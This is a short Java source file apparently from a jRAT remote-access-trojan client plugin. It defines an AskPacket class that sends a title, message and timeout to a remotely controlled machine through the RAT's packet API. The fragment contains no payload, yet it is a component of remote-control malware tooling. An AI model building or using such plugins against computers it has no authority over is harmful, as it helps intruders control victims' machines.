package pro.jrat.client;

import java.io.DataInputStream;
import java.io.DataOutputStream;

import pro.jrat.api.PacketBuilder;
import pro.jrat.api.RATObject;

public class AskPacket extends PacketBuilder {

	private String title;
	private String message;
	private int seconds;

	/**
	 * 
	 * @param rat
	 * @param title
	 * @param message
	 * @param i
	 */
	public AskPacket(RATObject rat, String title, String message, int i) {
		super(ExampleClientPlugin.HEADER, rat);
		this.title = title;
		this.message = message;
		this.seconds = i;
	}

	@Override
	public void write(RATObject rat, DataOutputStream dos, DataInputStream dis) throws Exception {
		dos.writeUTF(this.title);
		dos.writeUTF(this.message);
		dos.writeInt(seconds);
	}

}
